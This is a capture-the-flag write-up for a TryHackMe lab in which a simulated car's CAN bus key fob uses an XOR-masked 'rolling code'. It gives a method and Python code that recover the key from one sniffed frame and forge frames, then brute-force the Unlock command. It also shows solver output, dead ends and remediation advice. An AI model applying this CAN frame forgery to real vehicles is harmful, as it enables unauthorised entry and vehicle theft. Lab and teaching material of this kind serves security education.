# Phantom Fob — CAN Bus Rolling-Code Forgery

**Platform:** TryHackMe  
**Room:** [Phantom Fob](https://tryhackme.com/room/phantomfob)  
**Category:** Automotive Security / Embedded / CAN Bus  
**Difficulty:** Hard  
**Flag:** `THM{C4r_H4ck***_is_k***4_c00l}`

---

## Executive Summary

A demo vehicle's CAN bus is exposed over TCP. The provided key fob can Lock, Horn, and toggle the Immobiliser — but has no Unlock button. The manufacturer claims the rolling code "can't be copied." In reality, the scheme uses trivial XOR masking rather than proper cryptographic rolling codes (KeeLoq, AUT64, Hitag2). A live counter broadcast in the clear on the bus, combined with the auth formula leaking from every legitimate press, allows full key recovery from a single sniffed frame and forgery of arbitrary commands — including the missing Unlock.

**Vulnerability Class:** CWE-327 (Use of a Broken Cryptographic Algorithm), CWE-306 (Missing Authentication for Critical Function)  
**ATT&CK (ICS):** T0855 (Unauthorized Command Message), T0843 (Program Download)  
**CVSS 3.1:** 8.1 (AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)

---

## Reconnaissance

### Port Scan

```
22/tcp    — OpenSSH 9.6p1 (Ubuntu)
8080/tcp  — Werkzeug 3.1.8 / Python 3.12.3 (Flask — "Instrument Cluster" dashboard)
29536/tcp — socketcand (CAN bus socket)
```

### Web Application (8080)

The dashboard presents a live vehicle instrument cluster with four fob buttons:

- **LOCK** / **HORN** / **IMMOB_ARM** / **IMMOB_DISARM**

No Unlock button exists in the UI. Attempting `POST /press {"button": "UNLOCK"}` returns `{"msg": "no such control", "ok": false}`.

**Endpoints:**

| Method | Path     | Function                                                    |
|--------|----------|-------------------------------------------------------------|
| GET    | `/`      | Instrument cluster dashboard (HTML/JS)                      |
| POST   | `/press` | Simulate fob button press (JSON: `{"button": "LOCK"}`)     |
| GET    | `/events`| SSE stream — `locked`, `immob`, `horn`, `speed`, `flag`    |

The `flag` field in the SSE stream is `null` until a valid Unlock command is accepted by the BCM (Body Control Module).

### CAN Bus (29536)

Port 29536 speaks the **socketcand** line protocol over TCP:

```
server → < hi >
client → < open vcan0 >
server → < ok >
client → < rawmode >
server → < ok >
       ← frames stream as: < frame CAN_ID TIMESTAMP DATA_HEX >
```

Frame injection uses: `< send CAN_ID DLC BYTE0 BYTE1 ... BYTE7 >` (no acknowledgement returned, but injected frames echo in the stream).

---

## Enumeration

### Key Insight: Everything Is Randomized

All CAN IDs, fob byte positions, and constant values are **randomized per instance**. Hardcoded scripts from writeups will not work on a new deployment. The methodology below must be repeated from scratch for each instance.

### Step 1 — Identify Three CAN IDs

The bus carries three IDs relevant to the attack:

| Role             | Rate   | How to Find                                                  |
|------------------|--------|--------------------------------------------------------------|
| **Status**       | ~5/s   | Static data `010100a500000000`; byte changes on IMMOB_DISARM |
| **Command (Fob)**| on press | Absent in baseline; appears only after `/press`            |
| **Counter-Feed** | ~1/s   | One byte monotonically increments (+1 per frame)             |

**Procedure:**

1. Collect 5 seconds of baseline traffic (no button presses) — note all CAN IDs
2. Press LOCK via HTTP → diff CAN IDs → the **new** ID is the **Command ID**
3. Press IMMOB_DISARM → find the previously-static ID whose data changed → **Status ID**
4. Among remaining ~1/s IDs, find one with a monotonically incrementing byte → **Counter-Feed ID**

**Example (final instance):**

```
Baseline IDs: 093, 09E, 17F, 1C4, 250, 42D, 487, 4C2, 4F9
Command ID:   0x4AF (appeared after button press)
Status ID:    0x487 (static 010100a500000000, byte1 changed on IMMOB_DISARM)
Counter-Feed: 0x093 (byte position 1 increments monotonically)
```

### Step 2 — Map Fob Frame Byte Positions

Capture ~16 fob frames (4 buttons × 4 presses each) and classify each byte position:

| Role          | Detection Method                                      |
|---------------|-------------------------------------------------------|
| **Constant**  | Same value across all 16 samples                     |
| **Command**   | Same value within one button, different between buttons|
| **Counter**   | Monotonically increments +1 per press (global)        |
| **Rolling**   | Changes every press (auth or code-pair)               |

**Example byte map (final instance, CAN ID 0x4AF):**

```
B0: ROLLING (auth)     B1: 0xF6 (constant)
B2: COMMAND            B3: ROLLING (code-pair)
B4: 0x30 (constant)    B5: COUNTER
B6: ROLLING (code-pair) B7: 0x90 (constant)

Command bytes: LOCK=0xA0, HORN=0x2B, ARM=0xE7, DISARM=0x78
```

---

## Exploitation

### The Cryptographic Weakness

The fob's "rolling code" is a simple XOR mask:

```
auth_byte = counter XOR key XOR command
```

Where:
- `counter` = the fob's packet counter (visible in the frame)
- `command` = the button identifier (visible in the frame)
- `key` = a **session-static secret** — but recoverable from any single captured frame

**Key Recovery (one frame is enough):**

```
key = auth_byte XOR counter XOR command
```

This is the fundamental flaw. A real rolling-code system (KeeLoq, AES-based) derives the authentication value from a shared secret that never appears on the wire. Here, both the authentication byte and the counter are transmitted in the same frame, making the key trivially recoverable.

### The Code-Pair and Counter-Feed

Two bytes in the fob frame form a **code-pair** — values derived from the current counter-feed window (~0.9 seconds). These change when the counter-feed ID increments its broadcast byte. The code-pair from a captured frame remains valid only within the same window.

This means the entire attack — capture, key recovery, and command sweep — must complete within one counter-feed window (~0.9 seconds).

### Step 3 — Identify the Auth Byte

Among the rolling byte positions, one is the auth byte and the others form the code-pair. To determine which:

**Sanity Test:** For each rolling position, assume it is auth, recover the key, forge an IMMOB_DISARM frame, and inject it. Check the SSE stream — if `immob` flips to `false`, that position is confirmed as auth.

```python
for auth_pos in rolling_positions:
    key = frame[auth_pos] ^ frame[counter_pos] ^ frame[command_pos]
    forged = list(frame)
    forged[counter_pos] = (frame[counter_pos] + 1) & 0xFF
    forged[command_pos] = DISARM_CMD
    forged[auth_pos] = forged[counter_pos] ^ key ^ DISARM_CMD
    inject(forged)
    if sse["immob"] == False:
        print(f"Auth byte = B{auth_pos}")
        break
```

### Step 4 — Sweep for the Unlock Command

The unlock command byte is unknown, so sweep all 256 possible values. Each forged frame must have a valid counter and recalculated auth byte:

```python
# Capture a fresh LOCK frame
frame = capture_fob("LOCK")
key = frame[auth_pos] ^ frame[counter_pos] ^ frame[command_pos]

# Sweep immediately — must stay within the counter-feed window
for cmd_candidate in range(256):
    ctr = (frame[counter_pos] + 1 + cmd_candidate) & 0xFF
    forged = list(frame)
    forged[counter_pos] = ctr
    forged[command_pos] = cmd_candidate
    forged[auth_pos] = ctr ^ key ^ cmd_candidate
    inject(forged)
```

One of the 256 candidates is the valid Unlock command. The BCM accepts it, and the flag appears in the SSE stream.

### Timing Constraint

The sweep must be sent **immediately** after capture — no pauses, no SSE checks in between. The code-pair bytes from the captured frame expire when the counter-feed window rolls over. In testing, a standard approach with ~2.5 seconds between capture and check failed; a rapid-fire approach (capture → instant sweep) succeeded.

---

## Proof of Concept

### Complete Solver Output

```
[+] SSE: locked=True, immob=False, flag=None
[*] Connecting to CAN bus...
[+] CAN active: 306 frames, IDs: ['093','09E','17F','1C4','250','42D','487','4C2','4F9']
[+] Command ID 0x4AF not in baseline (expected — appears only on press)
[*] Testing fob frame capture...
[+] Capture works: 41F6A00F3086BC90

  [*] Trying auth=B0, code_pair=B[3, 6]
  [+] Captured: 23F6A0B730886890
      ctr=0x88 cmd=0xA0 auth(B0)=0x23
  [+] Recovered key: 0x0B
  [+] Sanity (DISARM forge): immob=False
  [+] DISARM worked! B0 IS the auth byte!

  [*] Rapid-fire with auth=B0...
  [+] locked=True, flag=THM{C4r_H4ck***_is_k***4_c00l}

============================================================
  FLAG: THM{C4r_H4ck***_is_k***4_c00l}
============================================================
```

---

## Dead Ends & Lessons Learned

### Dead Ends

| Approach | Why It Failed |
|----------|---------------|
| **Status-frame flood** | Flooding the status ID with `byte0=00` makes the dashboard *display* "UNLOCKED," but the flag requires a valid command accepted by the BCM — spoofing the display changes nothing server-side |
| **Capture-modify-replay** | Swapping only the command byte in a captured frame fails because the auth byte is bound to the command — `auth = ctr XOR key XOR cmd` means changing `cmd` without recalculating `auth` invalidates the frame |
| **PRNG cracking** | Attempting to predict rolling values via `random.seed(unix_timestamp)` produced zero matches — because the scheme isn't PRNG-based, it's simple XOR |
| **SSH brute-force** | SSH accepts only public-key authentication |
| **Fuzzing wrong byte position** | Byte positions are randomized per instance; hardcoding positions from a previous session targeted the counter instead of the command byte |

### Key Takeaways

1. **Identify all participants on the bus.** The counter-feed CAN ID was the missing piece across five sessions. Without the live counter, forged frames always carried stale values.

2. **Classify, don't hardcode.** Byte positions shuffle per instance. Build automated classification (constant/command/counter/rolling) rather than assuming positions from a previous run.

3. **Validate assumptions with sanity tests.** Instead of guessing which rolling byte is auth, forge a known command (DISARM) and check the observable effect. Empirical validation beats theoretical analysis when the scheme is opaque.

4. **Respect timing windows.** The code-pair expires with the counter-feed window (~0.9s). Any delay between capture and injection risks expiration. Minimize latency — send the sweep immediately after capture.

5. **"Forge the signal, don't replay it."** The room's own hint. Replay fails because rolling values change. Forgery works because the "rolling" scheme is just XOR masking with a recoverable key.

---

## Standards Mapping

| Finding | CWE | ATT&CK (ICS) | CVSS 3.1 |
|---------|-----|---------------|----------|
| XOR-based rolling code (no real crypto) | CWE-327 | T0855 (Unauthorized Command Message) | 8.1 |
| No CAN frame authentication | CWE-306 | T0843 (Program Download) | 8.1 |
| Counter broadcast in the clear | CWE-319 | T0839 (Module Firmware) | — |

---

## Remediation

1. **Use cryptographically secure rolling codes** (AES-128-CMAC, KeeLoq with sufficient key length) where the authentication value cannot be derived from observed traffic.
2. **Encrypt or authenticate CAN frames** — standards like SecOC (Secure Onboard Communication, AUTOSAR) add MACs to CAN frames, preventing injection.
3. **Do not broadcast counter values** in the clear — the counter-feed CAN ID hands the attacker the exact value needed to synchronize forged frames.
4. **Implement replay and rate-limit protections** at the BCM — reject rapid bursts of frames with sequential counters from a single source.

---

*Writeup by Artem | TryHackMe Profile: [nos010101](https://tryhackme.com/p/nos010101)*
